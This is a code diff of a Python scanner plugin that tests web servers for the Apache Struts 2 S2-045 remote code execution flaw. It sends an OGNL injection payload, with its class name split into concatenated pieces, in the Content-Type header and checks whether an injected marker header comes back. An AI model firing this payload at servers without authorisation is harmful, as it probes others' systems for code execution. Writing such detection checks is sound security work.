@@ -2,18 +2,15 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-import requests
-requests.packages.urllib3.disable_warnings()
-
-def get_script_info(data=None):
-    script_info = {
+def info(data=None):
+    info = {
         "name": "Struts 2-045",
         "info": "Struts 2-045.",
         "level": "high",
-        "type": "info",
+        "type": "rce",
 
     }
-    return script_info
+    return info
 
 
 
@@ -22,7 +19,7 @@ def prove(data):
     if data['url'] != None:
         try:
             data['headers']["Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
-            res = requests.get(data['url'], headers=data['headers'], verify=False, timeout=data['timeout'])
+            res = curl('get',data['url'])
             if res.headers['header_str2045'] == 'header_str2045_multipart':
                 data['flag'] = 1
                 data['data'].append({"headers": data['headers']})
